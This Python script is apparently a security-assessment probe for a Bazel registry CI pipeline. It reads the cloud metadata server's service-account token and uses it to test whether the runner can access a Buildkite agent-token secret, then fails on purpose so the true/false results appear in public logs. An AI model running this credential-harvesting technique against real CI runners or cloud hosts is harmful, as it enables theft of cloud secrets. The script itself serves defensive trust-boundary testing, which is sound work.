#!/usr/bin/env python3
"""Non-secret canary for the BCR CI trust-boundary assessment."""

import json
import sys
import urllib.request

METADATA_ROOT = "http://169.254.169.254/computeMetadata/v1"
SECRET_RESOURCE = "projects/bazel-untrusted/secrets/bazel-buildkite-agent-token"
PERMISSION = "secretmanager.versions.access"


def metadata(path):
    request = urllib.request.Request(
        f"{METADATA_ROOT}/{path}", headers={"Metadata-Flavor": "Google"}
    )
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    with opener.open(request, timeout=5) as response:
        return response.read()


def main():
    email = metadata("instance/service-accounts/default/email").decode().strip()
    scopes = metadata("instance/service-accounts/default/scopes").decode().splitlines()
    token_document = json.loads(
        metadata("instance/service-accounts/default/token").decode()
    )
    access_token = token_document["access_token"]

    body = json.dumps({"permissions": [PERMISSION]}).encode()
    request = urllib.request.Request(
        f"https://secretmanager.googleapis.com/v1/{SECRET_RESOURCE}:testIamPermissions",
        data=body,
        headers={
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json",
        },
        method="POST",
    )
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    with opener.open(request, timeout=10) as response:
        allowed = PERMISSION in json.loads(response.read()).get("permissions", [])

    print("BCR_BASELINE_METADATA_REACHABLE", file=sys.stderr, flush=True)
    print(
        "BCR_BASELINE_SERVICE_ACCOUNT_MATCH="
        + str(email == "buildkite@bazel-untrusted.iam.gserviceaccount.com").lower(),
        file=sys.stderr,
        flush=True,
    )
    print(
        "BCR_BASELINE_CLOUD_PLATFORM_SCOPE="
        + str("https://www.googleapis.com/auth/cloud-platform" in scopes).lower(),
        file=sys.stderr,
        flush=True,
    )
    print(
        "BCR_BASELINE_SECRET_ACCESS_PERMISSION=" + str(allowed).lower(),
        file=sys.stderr,
        flush=True,
    )

    # Fail intentionally so Bazel prints this non-secret output in the public job log.
    return 86


if __name__ == "__main__":
    raise SystemExit(main())
